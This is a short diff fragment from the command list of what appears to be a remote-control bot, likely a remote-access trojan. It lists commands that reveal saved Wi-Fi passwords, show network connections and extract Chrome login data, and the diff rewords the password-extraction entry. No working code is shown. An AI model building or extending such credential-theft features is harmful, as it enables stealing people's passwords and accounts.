@@ -281,7 +281,7 @@ COMMAND LIST:
 /wifilist - Show saved Wi-Fi networks
 /wifipass [name] - Show Wi-Fi password
 /netstat - Show active connections
-/passwords - Extract saved browser passwords
+/passwords - Chrome login data extraction (URLs and usernames)
 /chrome [url] - Open URL in Chrome
 /edge [url] - Open URL in Edge
 /firefox [url] - Open URL in Firefox
